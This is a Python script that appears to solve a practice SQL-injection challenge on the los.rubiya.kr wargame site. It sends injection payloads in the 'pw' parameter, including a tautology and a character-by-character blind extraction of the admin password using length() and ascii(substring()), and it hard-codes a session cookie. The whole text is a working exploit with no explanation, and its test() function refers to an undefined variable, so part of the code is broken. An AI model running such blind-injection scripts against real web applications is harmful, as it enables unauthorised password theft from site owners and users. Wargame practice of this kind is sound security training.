import requests

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookie = {'PHPSESSID': 'jlbe47hgjd8egih7n59612qdn8'}

def test():
    param = {"pw":"' or 1=1 #"}
    req = requests.get(url, params=param, cookies=cookie)
    if "Hello admin" in req.text:
        print(param1["pw"], "True")
    else:
        print(param1["pw"], "False")

def pw_len():
    for pw_length in range(50):
        param = {"pw":"' or id='admin' and length(pw) = {} #".format(pw_length)}
        req = requests.get(url, params=param, cookies=cookie)

        if "Hello admin" in req.text:
            print("length:", pw_length)
            return pw_length

def pw_find():
    length = int(pw_len())
    password = ""
    # start_value = 1
    # end_value = 127
    # value = 64
    for i in range(length):
        for value in range(127):
            param = {"pw":"' or id='admin' and ascii(substring(pw, {}, 1)) = {} #".format(i+1, value)}
            print(param)
            req = requests.get(url, params=param, cookies=cookie)
            if "Hello admin" in req.text:
                password += chr(value)
                break
            # else:
            #     param = {"pw":"' or id='admin' and ascii(substring(pw, {}, 1)) > {} #".format(i+1, value)}
            #     req = requests.get(url, params=param, cookies=cookie)
            #     if "Hello admin" in req.text:
            #         start_value = value
            #         value = (end_value + value) // 2
            #     else:
            #         end_value = value
            #         value = (start_value + value) // 2
                
    print("Password:", password)

pw_find()